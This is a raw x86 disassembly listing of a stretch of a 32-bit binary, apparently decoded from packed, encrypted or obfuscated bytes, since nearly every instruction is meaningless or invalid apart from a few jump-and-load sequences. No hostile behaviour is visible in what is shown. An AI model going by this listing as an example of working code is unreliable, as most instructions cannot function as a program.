  40a8c3:	sub    ah,BYTE PTR [esi+0x6efe16d5]
  40a8c9:	adc    BYTE PTR [eax],0x3b
  40a8cc:	fcmovu st,st(5)
  40a8ce:	dec    ebx
  40a8cf:	leave  
  40a8d0:	pushf  
  40a8d1:	and    al,0x37
  40a8d3:	sbb    ch,BYTE PTR [esi-0x6d]
  40a8d6:	out    0xe4,eax
  40a8d8:	mov    bl,0xb0
  40a8da:	jnp    0x40a8d8
  40a8dc:	cmp    esp,esi
  40a8de:	mov    ebx,0x55ea0c25
  40a8e3:	fwait
  40a8e4:	jo     0x40a880
  40a8e6:	adc    eax,0x571028d6
  40a8eb:	cmp    bh,BYTE PTR [eax-0x2f]
  40a8ee:	js     0x40a904
  40a8f0:	and    DWORD PTR [edi+0x58],esp
  40a8f3:	imul   eax,esp,0xe
  40a8f6:	lods   al,BYTE PTR ds:[esi]
  40a8f7:	in     al,0x6d
  40a8f9:	add    al,0xeb
  40a8fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a8fc:	jmp    0x7d12cf95
  40a901:	sbb    bh,BYTE PTR [ebp+0x40]
  40a904:	hlt    
  40a905:	xchg   esi,eax
  40a906:	mov    edx,ss
  40a908:	pop    ebp
  40a909:	add    DWORD PTR [edi+0x1dfbae0c],ebx
  40a90f:	int    0x76
  40a911:	ret    0xab7f
  40a914:	loopne 0x40a937
  40a916:	ins    DWORD PTR es:[edi],dx
  40a917:	out    dx,al
  40a918:	into   
  40a919:	fwait
  40a91a:	std    
  40a91b:	sahf   
  40a91c:	or     eax,DWORD PTR [eax-0x80]
  40a91f:	xchg   edi,eax
  40a920:	gs jle 0x40a8ac
  40a923:	cmp    BYTE PTR [ebx+0x5d8bec45],cl
  40a929:	clc    
  40a92a:	mov    ecx,0x7510850
  40a92f:	xor    eax,ecx
  40a931:	mov    esi,0x327298
  40a936:	jmp    0x40ac4f
  40a93b:	(bad)  
  40a93c:	xlat   BYTE PTR ds:[ebx]
  40a93d:	rcl    bh,1
  40a93f:	aad    0xd7
  40a941:	(bad)
  40a944:	xchg   ebx,eax
  40a945:	cdq    
  40a946:	add    edx,esi
  40a948:	into   
  40a949:	mov    ecx,0x7883dae4
  40a94e:	js     0x40a9c4
  40a950:	jle    0x40a9ca
  40a952:	js     0x40a974
  40a954:	mov    ebp,0xcd6aab1d
  40a959:	xor    DWORD PTR [esi-0x3b5e6ca1],ecx
  40a95f:	call   DWORD PTR [eax]
  40a961:	inc    ecx
  40a962:	loope  0x40a8fc
  40a964:	xor    DWORD PTR [ecx+edi*4],eax
  40a967:	and    al,0xc
  40a969:	retf   0x42ed
  40a96c:	xchg   ecx,eax
  40a96d:	mov    ds,WORD PTR [edx+0x66b1924d]
  40a973:	mov    eax,0x1a04a3b5
  40a978:	pop    esi
  40a979:	dec    esp
  40a97a:	loope  0x40a9c7
  40a97c:	inc    DWORD PTR [edi-0x8bac44b]
  40a982:	sub    DWORD PTR [edx+0x9b2b2c3],ebx
  40a988:	jo     0x40a992
  40a98a:	ins    BYTE PTR es:[edi],dx
  40a98b:	mov    ebp,ecx
  40a98d:	pop    esp
  40a98e:	shl    DWORD PTR [esi+0x1e],1
  40a991:	mov    ebp,0xef2e61f
  40a996:	hlt    
  40a997:	call   0x3554:0xa37b8deb
  40a99e:	fadd   QWORD PTR [edi-0x30]
  40a9a1:	jne    0x40a928
  40a9a3:	(bad)  
  40a9a5:	mov    eax,0x27452d92
  40a9aa:	cmp    al,0xdd
  40a9ac:	jl     0x40a94a
  40a9ae:	in     eax,0x60
  40a9b0:	push   eax
  40a9b1:	outs   dx,DWORD PTR ds:[esi]
  40a9b2:	test   BYTE PTR [ecx+0x18d6498],al
  40a9b8:	add    esp,eax
  40a9ba:	jl     0x40aa21
  40a9bc:	adc    eax,eax
  40a9be:	(bad)
  40a9c1:	(bad)  
  40a9c2:	jge    0x40a9c0
  40a9c4:	sbb    ecx,DWORD PTR ds:0x94103f05
  40a9ca:	adc    eax,0x77070d1
  40a9cf:	mov    dl,0x49
  40a9d1:	rcr    dl,cl
  40a9d3:	mov    cl,0x84
  40a9d5:	ret    0xe76b
  40a9d8:	jge    0x40a99d
  40a9da:	clc    
  40a9db:	push   es
  40a9dc:	loopne 0x40a968
  40a9de:	jl     0x40a9ca
  40a9e0:	test   eax,esp
  40a9e2:	arpl   WORD PTR [esi],bp
  40a9e4:	push   0xffffffd6
  40a9e6:	mov    DWORD PTR [edi+0x0],ebp
  40a9e9:	div    DWORD PTR [ecx-0x43]
  40a9ec:	in     al,dx
  40a9ed:	std    
  40a9ee:	lea    ebx,[esi+0x5f]
  40a9f1:	mov    ah,BYTE PTR [edi+esi*2-0x78]
  40a9f5:	add    dl,BYTE PTR [esi-0x644b07b4]
  40a9fb:	jbe    0x40a993
  40a9fd:	sub    BYTE PTR [edi+0x7a],bh
  40aa00:	dec    edx
  40aa01:	push   edi
  40aa02:	addr16 out dx,eax
  40aa04:	dec    ecx
  40aa05:	js     0x40aa59
  40aa07:	sbb    al,0x56
  40aa09:	xchg   ebx,eax
  40aa0a:	jns    0x40a9d2
  40aa0c:	cli    
  40aa0d:	test   cl,dh
  40aa0f:	(bad)  
  40aa10:	imul   esp,DWORD PTR [ebx-0x2387ba7b],0x2358c7e4
  40aa1a:	adc    BYTE PTR [ecx],ch
  40aa1c:	mov    dh,0x86
  40aa1e:	lea    ebp,[ecx+eiz*4]
  40aa21:	icebp  
  40aa22:	mov    eax,0x31bfd92a
  40aa27:	in     eax,0xd8
  40aa29:	loopne 0x40a9bf
  40aa2b:	xchg   ecx,eax
  40aa2c:	lock mov edi,0x7fbcff54
  40aa32:	pop    eax
  40aa33:	outs   dx,DWORD PTR ds:[esi]
  40aa34:	arpl   bx,bp
  40aa36:	es inc ebx
  40aa38:	aaa    
  40aa39:	xchg   edi,eax
  40aa3a:	dec    ebx
  40aa3b:	pop    ebp
  40aa3c:	pop    ebx
  40aa3d:	mov    esp,0xe3c16028
  40aa42:	or     eax,0x6c3ceba4
  40aa47:	stc    
  40aa48:	jo     0x40aa92
  40aa4a:	outs   dx,BYTE PTR ds:[esi]
  40aa4b:	xor    eax,DWORD PTR [ebp-0x6384b24c]
  40aa51:	pop    ecx
  40aa52:	in     eax,dx
  40aa53:	sar    DWORD PTR [ebp+0x69],0x17
  40aa57:	jg     0x40aa59
  40aa59:	test   DWORD PTR [edi+0x1d489f51],edx
  40aa5f:	fwait
  40aa60:	test   BYTE PTR [ecx-0x31],ah
  40aa63:	ins    DWORD PTR es:[edi],dx
  40aa64:	or     BYTE PTR [edi],0x51
  40aa67:	test   BYTE PTR [edx+eax*8],dl
  40aa6a:	stos   DWORD PTR es:[edi],eax
  40aa6b:	je     0x40aa63
  40aa6d:	in     al,0x5e
  40aa6f:	and    al,0x8b
  40aa71:	and    DWORD PTR [esi],esp
  40aa73:	push   esp
  40aa74:	es pop ss
  40aa76:	in     eax,dx
  40aa77:	add    cl,BYTE PTR [edx]
  40aa79:	or     al,0x57
  40aa7b:	hlt    
  40aa7c:	mov    bl,0xe0
  40aa7e:	das    
  40aa7f:	jmp    0xf87a4080
  40aa84:	cmc    
  40aa85:	fistp  DWORD PTR [esi]
  40aa87:	fsub   st(4),st
  40aa89:	gs xchg ecx,eax
  40aa8b:	les    edi,FWORD PTR [ebp+0x146dd6e0]
  40aa91:	leave  
  40aa92:	outs   dx,BYTE PTR ds:[esi]
  40aa93:	or     eax,0x8a69aa75
  40aa98:	mov    ebp,0xbc6716f2
  40aa9d:	sbb    al,0x24
  40aa9f:	and    eax,0x17aad9c3
  40aaa4:	or     bh,BYTE PTR [esi]
  40aaa6:	inc    eax
  40aaa7:	inc    edx
  40aaa8:	mov    ebx,DWORD PTR [eax]
  40aaaa:	mov    eax,ds:0xeb2271c
  40aaaf:	xchg   edx,eax
  40aab0:	lahf   
  40aab1:	xchg   edx,eax
  40aab2:	mov    ds:0xff76c0ab,al
  40aab7:	daa    
  40aab8:	addr16 dec eax
  40aaba:	inc    esi
  40aabb:	sub    ebp,DWORD PTR [esi+0x16]
  40aabe:	add    eax,0xd8f0a827
  40aac3:	imul   edx,DWORD PTR [edi],0xffffff9c
  40aac6:	int3   
  40aac7:	in     eax,0xd4
  40aac9:	das    
  40aaca:	jmp    0x40aade
  40aacc:	inc    ebp
  40aacd:	in     eax,0x6e
  40aacf:	mov    eax,0x319ccd9b
  40aad4:	test   DWORD PTR [edx+0x18],0x711def0a
  40aadb:	lods   al,BYTE PTR ds:[esi]
  40aadc:	sub    al,0x31
  40aade:	fadd   QWORD PTR [ecx+0x4e]
  40aae1:	xor    DWORD PTR [ebx-0x32c0fabb],ecx
  40aae7:	imul   edx,esp,0x17385037
  40aaed:	into   
  40aaee:	xor    eax,0x169f7023
  40aaf3:	fidivr DWORD PTR [esi]
  40aaf5:	push   0x5c67aa0b
  40aafa:	pop    es
  40aafb:	pminsw mm2,QWORD PTR [edx]
  40aafe:	mov    edi,0x778c2ef1
  40ab03:	shl    dh,1
  40ab05:	mov    fs,WORD PTR [ecx-0x75]
  40ab08:	jmp    0x3362:0x25264ef2
  40ab0f:	push   ecx
  40ab10:	and    al,0xf6
  40ab12:	add    al,0xb5
  40ab14:	lods   eax,DWORD PTR ds:[esi]
  40ab15:	xchg   esp,eax
  40ab16:	and    dl,dl
  40ab18:	mov    eax,0xe9aaab55
  40ab1d:	rcr    DWORD PTR [ebp-0x1a],1
  40ab20:	or     al,0x4c
  40ab22:	(bad)  [ebp+0x9]
  40ab25:	xchg   edi,eax
  40ab26:	imul   esp,DWORD PTR [esp+edi*2-0x2601803f],0xffffffe9
  40ab2e:	aam    0xe2
  40ab30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab31:	sub    bh,BYTE PTR [eax+ecx*4-0x65400590]
  40ab38:	aam    0x40
  40ab3a:	sub    al,BYTE PTR [edx-0x2b0d7ccc]
  40ab40:	aas    
  40ab41:	adc    eax,0xa22bdd8a
  40ab46:	jnp    0x40aaf1
  40ab48:	xchg   ebp,eax
  40ab49:	mov    BYTE PTR [ecx],cl
  40ab4b:	jp     0x40ab4e
  40ab4d:	inc    edx
  40ab4e:	mov    al,ds:0xba07d8d5
  40ab53:	dec    eax
  40ab54:	loop   0x40ab59
  40ab56:	mov    eax,ds:0xc5d42a0d
  40ab5b:	loop   0x40aade
  40ab5d:	loop   0x40ab77
  40ab5f:	std    
  40ab60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab61:	mov    esi,0xdc212893
  40ab66:	mov    ecx,0xeaad1961
  40ab6b:	jmp    0xa6073cfe
  40ab70:	or     ch,BYTE PTR [eax+0x6e5f6a03]
  40ab76:	adc    BYTE PTR [edx],bl
  40ab78:	retf   0x6314
  40ab7b:	or     al,0x3b
  40ab7d:	dec    ebx
  40ab7e:	test   BYTE PTR [edx+0x23],ch
  40ab81:	ret    0x5063
  40ab84:	or     BYTE PTR [ecx-0x4e],dh
  40ab87:	or     BYTE PTR [edx+0x2d4cd0af],ch
  40ab8d:	mov    ebx,0x8d45251b
  40ab92:	xor    esi,DWORD PTR [ebx+esi*2+0x63]
  40ab96:	inc    esi
  40ab97:	je     0x40abaa
  40ab99:	daa    
  40ab9a:	test   esi,ebp
  40ab9c:	mov    bl,BYTE PTR [ebx+0x4e]
  40ab9f:	pop    edi
  40aba0:	mov    al,0x8b
  40aba2:	cli    
  40aba3:	pop    ss
  40aba4:	sbb    cl,dl
  40aba6:	das    
  40aba7:	outs   dx,DWORD PTR ds:[esi]
  40aba8:	rol    ecx,1
  40abaa:	xchg   edi,eax
  40abab:	pop    ss
  40abac:	pop    ebx
  40abad:	les    edx,FWORD PTR [ecx]
  40abaf:	inc    eax
  40abb0:	ret    0x7fb3
  40abb3:	mov    al,0x86
  40abb5:	cmp    esp,DWORD PTR ds:0xd51932a7
  40abbb:	ja     0x40ac05
  40abbd:	popa   
  40abbe:	sub    eax,0xd1b30ec5
  40abc3:	xchg   DWORD PTR [esi+0x29],eax
  40abc6:	mov    DWORD PTR [ebx-0x4e],esi
  40abc9:	xor    DWORD PTR [esi+0x27739fbb],ebp
  40abcf:	cld    
  40abd0:	xchg   ecx,eax
  40abd1:	adc    al,BYTE PTR [edx-0x1b4232e2]
  40abd7:	push   ds
  40abd8:	mov    dh,0xb4
  40abda:	iret   
  40abdb:	sbb    al,0x4b
  40abdd:	pop    eax
  40abde:	mov    bl,BYTE PTR [ecx]
  40abe0:	inc    edx
  40abe1:	outs   dx,DWORD PTR ds:[esi]
  40abe2:	sub    bl,BYTE PTR [eax+0x21704ed6]
  40abe8:	push   ds
  40abe9:	sub    al,0x4
  40abeb:	jle    0x40aba4
  40abed:	ds mov ebx,0x45eb12ed
  40abf3:	call   0xd180:0xcfdbc9be
  40abfa:	or     cl,bl
  40abfc:	pop    ss
  40abfd:	push   0xd274857a
  40ac02:	test   DWORD PTR [ecx-0x25545229],edx
  40ac08:	sbb    esp,DWORD PTR [ebx]
  40ac0a:	add    ebp,edx
  40ac0c:	je     0x40ac37
  40ac0e:	xchg   edi,eax
  40ac0f:	inc    ebp
  40ac10:	adc    BYTE PTR [esi+0x1308412f],0x76
  40ac17:	mov    BYTE PTR [edx-0x18],dl
  40ac1a:	or     al,BYTE PTR [ebp+0x33a64eb0]
  40ac20:	test   DWORD PTR [eax+0x30059149],0xcf37ee8c
  40ac2a:	jl     0x40ac68
  40ac2c:	add    esi,DWORD PTR [esi-0x4ed51bb]
  40ac32:	out    0x3a,al
  40ac34:	test   eax,0xc68f9afd
  40ac39:	ret    0x6200
  40ac3c:	jo     0x40ac72
  40ac3e:	mov    eax,0x821b0178
  40ac43:	mov    edi,0xf831952b
  40ac48:	jae    0x40abff
  40ac4a:	iret   
  40ac4b:	popf   
  40ac4c:	fs (bad) 
  40ac4e:	div    DWORD PTR [ebx]
  40ac50:	fnstenv [ebx]
  40ac52:	rol    BYTE PTR [ebx],cl
  40ac54:	mov    BYTE PTR [ebx],0xde
  40ac57:	div    ebx
  40ac59:	mov    edx,DWORD PTR [ebp-0x20]
  40ac5c:	mov    DWORD PTR [ebp-0x2c],0x4f35
  40ac63:	cmp    eax,DWORD PTR [edx]
  40ac65:	je     0x40c955
  40ac6b:	mov    DWORD PTR [ebp-0xc],0x705fd8e
  40ac72:	lea    eax,[ebp-0xc]
  40ac75:	mov    DWORD PTR [ebp-0x10],eax
  40ac78:	mov    eax,DWORD PTR [ebp-0x10]
  40ac7b:	jmp    0x40af94
  40ac80:	aas    
  40ac81:	aas    
  40ac82:	iret   
  40ac83:	(bad)  
  40ac84:	iret   
  40ac85:	xlat   BYTE PTR ds:[ebx]
  40ac86:	xlat   BYTE PTR ds:[ebx]
  40ac87:	(bad)  
  40ac88:	fist   WORD PTR [eax]
  40ac8a:	push   eax
  40ac8b:	ucomiss xmm4,DWORD PTR [eax+ebx*1]
  40ac8f:	test   al,0xd6
  40ac91:	cmp    BYTE PTR [eax+0x78],0x74
  40ac95:	jle    0x40ad0f
  40ac97:	js     0x40ace3
  40ac99:	jecxz  0x40acf1
  40ac9b:	mov    ?,WORD PTR [eax-0x73e930f8]
  40aca1:	mov    al,0x63
  40aca3:	dec    edi
  40aca4:	cmp    bh,al
  40aca6:	or     ebx,0xffffff9e
  40aca9:	popa   
  40acaa:	sub    ch,BYTE PTR [ebp-0x568f6257]
  40acb0:	add    al,BYTE PTR [eax+0x19]
  40acb3:	mov    esi,0x767a6f05
  40acb8:	pop    ebp
  40acb9:	push   eax
  40acba:	(bad)  
  40acbb:	stc    
  40acbc:	pop    eax
  40acbd:	and    eax,0x1b5541ae
  40acc2:	mov    cl,BYTE PTR [esp+ebp*2]
  40acc5:	fnstcw WORD PTR [ecx+0x71]
  40acc8:	xor    bl,bl
  40acca:	repz xchg esi,eax
  40accc:	ja     0x40acd4
  40acce:	mov    esi,0x877aa6c6
  40acd3:	call   0x80d66e65
  40acd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40acd9:	ret    0x2580
  40acdc:	out    0x2b,eax
  40acde:	pop    ds
  40acdf:	push   esi
  40ace0:	mov    cl,0xf5
  40ace2:	mov    edx,0xbd4f9631
  40ace7:	in     al,0x51
  40ace9:	mov    al,ds:0xfe2b8359
  40acee:	nop    DWORD PTR [edi+edx*8-0x35]
  40acf3:	and    dh,BYTE PTR [ebx+0x6c]
  40acf6:	adc    eax,0x71fc1b1c
  40acfb:	push   edx
  40acfc:	mov    ah,0x57
  40acfe:	dec    esp
  40acff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad00:	dec    edx
  40ad01:	test   DWORD PTR [eax+0x64d6626c],ecx
  40ad07:	push   cs
  40ad08:	retf   
  40ad09:	xchg   ecx,eax
  40ad0a:	add    eax,0xea30ecfc
  40ad0f:	fldcw  WORD PTR [eax]
  40ad11:	push   ebx
  40ad12:	cmp    BYTE PTR [ebx],bh
  40ad14:	fmul   DWORD PTR [eax-0x28ee573d]
  40ad1a:	mov    al,ds:0x1506da67
  40ad1f:	pop    edx
  40ad20:	sti    
  40ad21:	cdq    
  40ad22:	lds    ebp,FWORD PTR [ebx]
  40ad24:	mov    ebp,0x245beec8
  40ad29:	aad    0x4a
  40ad2b:	jle    0x40ad8f
  40ad2d:	jg     0x40ad78
  40ad2f:	(bad)  
  40ad30:	in     al,dx
  40ad31:	dec    edx
  40ad32:	lods   eax,DWORD PTR ds:[esi]
  40ad33:	pop    eax
  40ad34:	imul   edi,DWORD PTR [esi],0xb
  40ad37:	out    0xad,eax
  40ad39:	scas   eax,DWORD PTR es:[edi]
  40ad3a:	out    0x6,eax
  40ad3c:	jg     0x40acc5
  40ad3e:	ins    DWORD PTR es:[edi],dx
  40ad3f:	sbb    dh,bh
  40ad41:	das    
  40ad42:	or     esi,ebx
  40ad44:	mov    eax,0x2a6abfcc
  40ad49:	shl    BYTE PTR ds:0xeaf1f500,cl
  40ad4f:	mov    ds:0xfa503540,eax
  40ad54:	or     al,0x5d
  40ad56:	out    dx,eax
  40ad57:	imul   esp,DWORD PTR [edx-0x25e198f0],0xd34888f7
  40ad61:	pop    ecx
  40ad62:	rol    BYTE PTR [edi+0x79],cl
  40ad65:	mul    BYTE PTR [eax+ebx*2-0x4bdf5b2e]
  40ad6c:	popa   
  40ad6d:	mov    bl,0x19
  40ad6f:	mov    edi,0xc9a62b1d
  40ad74:	push   esi
  40ad75:	mov    edx,DWORD PTR [esi+ebx*1+0x613c041b]
  40ad7c:	addr16 push eax
  40ad7e:	bound  eax,QWORD PTR [eax+0xc]
  40ad81:	mov    DWORD PTR [eax+ecx*8],esp
  40ad84:	stos   BYTE PTR es:[edi],al
  40ad85:	fmul   QWORD PTR [edx]
  40ad87:	popa   
  40ad88:	inc    edi
  40ad89:	fnstenv ss:[esi+0x1f732dc8]
  40ad90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad91:	lods   eax,DWORD PTR ds:[esi]
  40ad92:	outs   dx,BYTE PTR ds:[esi]
  40ad93:	stos   DWORD PTR es:[edi],eax
  40ad94:	mov    ds:0x30f2b19b,al
  40ad99:	in     eax,dx
  40ad9a:	and    al,0x4d
  40ad9c:	pop    edi
  40ad9d:	or     esp,eax
  40ad9f:	xchg   ebp,eax
  40ada0:	sub    edi,DWORD PTR [edx]
  40ada2:	xchg   BYTE PTR [edi+0x7a],ah
  40ada5:	inc    ebx
  40ada6:	xor    dh,BYTE PTR [edi+eiz*8-0x2b7457a1]
  40adad:	and    dh,BYTE PTR [esi-0x5a974c3f]
  40adb3:	mov    eax,0x53fdc212
  40adb8:	inc    ebp
  40adb9:	jle    0x40ad77
  40adbb:	(bad)  
  40adbc:	mov    eax,ds:0x7e759c42
  40adc1:	mov    WORD PTR [ebx+ecx*8+0x5d65e20a],es
  40adc8:	mov    eax,0xa04f9543
  40adcd:	xchg   edi,eax
  40adce:	xor    eax,0x1554b1d4
  40add3:	sbb    eax,0xcc5eb1a7
  40add8:	pusha  
  40add9:	mov    bh,0xe5
  40addb:	pop    edi
  40addc:	lock pop edi
  40adde:	int3   
  40addf:	sahf   
  40ade0:	inc    eax
  40ade1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ade2:	cwde   
  40ade3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ade4:	adc    esi,esp
  40ade6:	push   edi
  40ade7:	xor    ecx,esp
  40ade9:	jle    0x40adf5
  40adeb:	pop    es
  40adec:	mov    ah,0xc8
  40adee:	push   edx
  40adef:	cmp    ah,BYTE PTR [ebx+0x4d90a44]
  40adf5:	add    eax,DWORD PTR ds:0xd1fc9cf2
  40adfb:	shr    BYTE PTR [ecx+0x4393b14],1
  40ae01:	fcomi  st,st(5)
  40ae03:	fs push ebx
  40ae05:	ret    0x294d
  40ae08:	inc    esi
  40ae09:	mov    esp,0x74775258
  40ae0e:	sub    al,0x79
  40ae10:	pusha  
  40ae11:	jne    0x40ae25
  40ae13:	jmp    0x4023:0x1c9d33e0
  40ae1a:	jg     0x40ae18
  40ae1c:	mov    ah,0x2d
  40ae1e:	push   ss
  40ae1f:	aas    
  40ae20:	jge    0x40adf9
  40ae22:	mov    bh,0x57
  40ae24:	jns    0x40adfb
  40ae26:	pop    edi
  40ae27:	mov    ch,0x16
  40ae29:	(bad)  
  40ae2a:	fnsave ds:0x6d06dd18
  40ae30:	(bad)  
  40ae32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae33:	dec    edx
  40ae34:	rol    BYTE PTR [edi-0x4971ca80],0xc
  40ae3b:	ds inc edi
  40ae3d:	sub    DWORD PTR [ecx+0x66],edi
  40ae40:	fstp   QWORD PTR [ebx]
  40ae42:	xchg   DWORD PTR [edi+eax*1],ecx
  40ae45:	pop    esp
  40ae46:	xor    al,0x9e
  40ae48:	push   es
  40ae49:	mov    ch,0xfa
  40ae4b:	adc    eax,0xf7677a10
  40ae50:	mov    edx,0x9db13d0c
  40ae55:	test   al,0x48
  40ae57:	xor    eax,0x216023a2
  40ae5c:	xchg   ebp,eax
  40ae5d:	sbb    eax,0x970db36c
  40ae62:	dec    ecx
  40ae63:	stc    
  40ae64:	adc    BYTE PTR [ebp+0x7f],ch
  40ae67:	push   ebp
  40ae68:	cdq    
  40ae69:	dec    ecx
  40ae6a:	js     0x40ae7d
  40ae6c:	pop    edi
  40ae6d:	jecxz  0x40aedf
  40ae6f:	out    dx,eax
  40ae70:	loopne 0x40aeea
  40ae72:	ficom  DWORD PTR [edx]
  40ae74:	je     0x40aeb1
  40ae76:	fcom   DWORD PTR [edx+0x585cd9b0]
  40ae7c:	fst    QWORD PTR [edx+0x37616fe8]
  40ae82:	fs mov ebp,0xe54a9a3e
  40ae88:	stos   BYTE PTR es:[di],al
  40ae8a:	ins    BYTE PTR es:[edi],dx
  40ae8b:	ss xchg edx,eax
  40ae8d:	xor    ah,BYTE PTR [edi-0x7608628d]
  40ae93:	mov    WORD PTR [ecx-0x38930f52],cs
  40ae99:	push   ebx
  40ae9a:	lods   eax,DWORD PTR ds:[esi]
  40ae9b:	xor    bh,BYTE PTR [ecx+edi*4]
  40ae9e:	jle    0x40ae77
  40aea0:	scas   eax,DWORD PTR es:[edi]
  40aea1:	sbb    BYTE PTR [ebp-0x71],ch
  40aea4:	cmp    al,0x86
  40aea6:	xchg   BYTE PTR [ebx+0x7aee5f3d],dh
  40aeac:	popf   
  40aead:	loopne 0x40aec4
  40aeaf:	jle    0x40aed2
  40aeb1:	out    0x3c,al
  40aeb3:	jp     0x40aee9
  40aeb5:	add    DWORD PTR [eax+0x5e],esp
  40aeb8:	inc    eax
  40aeb9:	sbb    bh,BYTE PTR [esi-0x3]
  40aebc:	or     BYTE PTR [edi],0x40
  40aebf:	sbb    eax,esi
  40aec1:	adc    ebp,DWORD PTR [edi-0x7a]
  40aec4:	jmp    0x504e:0xc3a40ef7
  40aecb:	mov    ebx,0xabc84d21
  40aed0:	sub    al,0xb1
  40aed2:	sub    ah,ch
  40aed4:	adc    eax,0xdec55bb7
  40aed9:	lds    eax,FWORD PTR [bx+si]
  40aedc:	fsub   DWORD PTR [edi-0x6b]
  40aedf:	adc    dl,bl
  40aee1:	xchg   ebx,eax
  40aee2:	fcomi  st,st(0)
  40aee4:	add    ah,BYTE PTR [ebx]
  40aee6:	cmp    BYTE PTR [eax],dh
  40aee8:	dec    esp
  40aee9:	(bad)  
  40aeea:	and    eax,0xa23be145
  40aeef:	sbb    DWORD PTR [esp+edx*1+0xdfd3604],0x350ef3c2
  40aefa:	ds push ss
  40aefc:	jecxz  0x40af0b
  40aefe:	test   cl,bl
  40af00:	test   dh,bl
  40af02:	test   BYTE PTR [edi+eax*2+0x4b],cl
  40af06:	int    0x6a
  40af08:	sub    dl,BYTE PTR [ebx]
  40af0a:	outs   dx,DWORD PTR ds:[esi]
  40af0b:	dec    ebp
  40af0c:	jnp    0x40af23
  40af0e:	add    DWORD PTR [ebx],esi
  40af10:	add    eax,0xad83b836
  40af15:	inc    eax
  40af16:	lods   eax,DWORD PTR ds:[esi]
  40af17:	dec    esi
  40af18:	dec    ebx
  40af19:	pop    esi
  40af1a:	cmp    al,0x5e
  40af1c:	aaa    
  40af1d:	or     al,0x84
  40af1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af20:	xlat   BYTE PTR ds:[ebx]
  40af21:	nop
  40af22:	hlt    
  40af23:	and    BYTE PTR [esi-0x19],al
  40af26:	sbb    BYTE PTR [ebx],dl
  40af28:	int    0x38
  40af2a:	dec    eax
  40af2b:	enter  0x106f,0xe6
  40af2f:	mov    ds:0x3d8313bf,eax
  40af34:	mov    esi,0x2d971ab3
  40af39:	push   0x5691c0f3
  40af3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af3f:	pop    edi
  40af40:	ret    
  40af41:	ror    ecx,0x5e
  40af44:	sub    bl,BYTE PTR [esi+0x2607fe30]
  40af4a:	push   cs
  40af4b:	push   es
  40af4c:	jmp    0x40aed8
  40af4e:	push   ebp
  40af4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af50:	mov    ecx,0xf0d73910
  40af55:	mov    al,0x8e
  40af57:	push   esp
  40af58:	call   0x96503688
  40af5d:	sti    
  40af5e:	push   eax
  40af5f:	shr    DWORD PTR [ecx],1
  40af61:	dec    edi
  40af62:	loopne 0x40af42
  40af64:	mov    cl,0x7
  40af66:	pop    ss
  40af67:	fbld   TBYTE PTR [edx]
  40af69:	ret    
  40af6a:	imul   ebx,DWORD PTR [ebx+edx*4-0x61],0xffffff90
  40af6f:	into   
  40af70:	mov    dl,0x4f
  40af72:	popa   
  40af73:	jmp    0x9449f88f
  40af78:	mov    dh,0xc1
  40af7a:	lods   eax,DWORD PTR ds:[esi]
  40af7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af7c:	dec    edi
  40af7d:	lods   eax,DWORD PTR ds:[esi]
  40af7e:	and    ebp,ebp
  40af80:	lea    ebx,[edx-0x5540f07e]
  40af86:	lahf   
  40af87:	sti    
  40af88:	dec    ebx
  40af89:	loop   0x40afae
  40af8b:	aas    
  40af8c:	pushf  
  40af8d:	xchg   ebp,eax
  40af8e:	shr    ah,cl
  40af90:	jp     0x40af21
  40af92:	imul   ebx,ebp,0xffffff8b
  40af95:	adc    BYTE PTR [ecx-0x2e],ch
  40af98:	in     eax,dx
  40af99:	test   eax,0x1089f89e
  40af9e:	mov    eax,DWORD PTR [ebp-0xc]
  40afa1:	jmp    0x40b2ba
  40afa6:	sar    DWORD PTR ds:0xc9d9c1c9,cl
  40afac:	fcmovne st,st(5)
  40afae:	mov    bl,0x22
  40afb0:	fsub   st(2),st
  40afb2:	inc    esi
  40afb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40afb4:	add    bl,BYTE PTR [edi+0x787885d2]
  40afba:	je     0x40b03a
  40afbc:	js     0x40b036
  40afbe:	adc    al,BYTE PTR [edi]
  40afc0:	inc    esi
  40afc1:	out    dx,eax
  40afc2:	rcr    DWORD PTR [esi+eiz*4],1
  40afc5:	xor    eax,0x47b41b5
  40afca:	pop    edi
  40afcb:	push   0x8586b01c
  40afd0:	push   es
  40afd1:	repnz sub eax,0x42951d67
  40afd7:	addr16 pusha 
  40afd9:	push   esp
  40afda:	mov    eax,ds:0xeb530e0e
  40afdf:	sbb    ecx,DWORD PTR [eax+0x20ebecfd]
  40afe5:	ins    DWORD PTR es:[edi],dx
  40afe6:	in     al,dx
  40afe7:	imul   esi,DWORD PTR [edi-0x648ac526],0x85fe4467
  40aff1:	and    bh,0xab
  40aff4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aff5:	cmp    eax,0xb8a80ff6
  40affa:	jns    0x40b036
  40affc:	jmp    0xdc21:0x5b9faaa7
  40b003:	mov    dh,ah
  40b005:	cmp    cl,cl
  40b007:	sub    al,0xc4
  40b009:	add    al,0xfb
  40b00b:	shl    esp,1
  40b00d:	cld    
  40b00e:	add    al,0xc3
  40b010:	inc    ecx
  40b011:	idiv   DWORD PTR [eax]
  40b013:	sbb    bh,BYTE PTR [eax+0x563ead5a]
  40b019:	inc    edx
  40b01a:	gs pop ss
  40b01c:	xchg   edi,eax
  40b01d:	cmc    
  40b01e:	jl     0x40b077
  40b020:	xchg   DWORD PTR [ecx],ebp
  40b022:	(bad)  [ecx+ebp*4+0x731d0b3]
  40b029:	(bad)  
  40b02a:	cwde   
  40b02b:	sbb    al,0xfe
  40b02d:	xchg   edi,eax
  40b02e:	popf   
  40b02f:	mov    ah,0xe2
  40b031:	fst    QWORD PTR [edx+eiz*1+0x6bfc6cb1]
  40b038:	sub    ebp,DWORD PTR [eax+0x67]
  40b03b:	popa   
